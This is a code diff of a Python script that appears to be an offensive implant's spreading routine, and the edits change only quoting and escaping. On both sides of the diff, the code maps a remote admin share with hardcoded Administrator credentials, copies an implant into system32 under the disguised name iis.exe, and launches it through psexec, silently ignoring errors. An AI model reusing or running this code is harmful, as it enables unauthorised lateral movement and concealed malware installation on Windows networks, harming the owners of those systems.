@@ -144,9 +144,9 @@ def implant_Copy():
 
 def computer_Scheduler():
     if debug == 1:
-        print ("Enterping Scheduler")
-    subprocess.Popen(r"schtasks /Delete /TN MyBatch /F")
-    subprocess.Popen(r"net use Z: \\pci.example.com\c$ /user:example.com\Administrator cisco")
+        print ('Enterping Scheduler')
+    subprocess.Popen(r'schtasks /Delete /TN MyBatch /F')
+    subprocess.Popen(r'net use Z: \\pci.example.com\c$ /user:example.com\Administrator cisco')
     try:
         if os.path.isfile(implantName):
             shutil.copy(implantName, "Z:\\Windows\\system32\\iis.exe")
@@ -161,7 +161,7 @@ def computer_Scheduler():
 
     if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
         try:
-            psexecer = 'psexec.exe','/accepteula','\\pci.example.com','-u','example.com\administrator','-p','cisco','C:\windows\system32\iis.exe'
+            psexecer = 'psexec.exe','/accepteula','\\\pci.example.com','-u','example.com\\administrator','-p','cisco','C:\\windows\\system32\\iis.exe'
             psexecopen = subprocess.Popen(psexecer, shell=True, stdout=subprocess.PIPE)
         except:
             pass
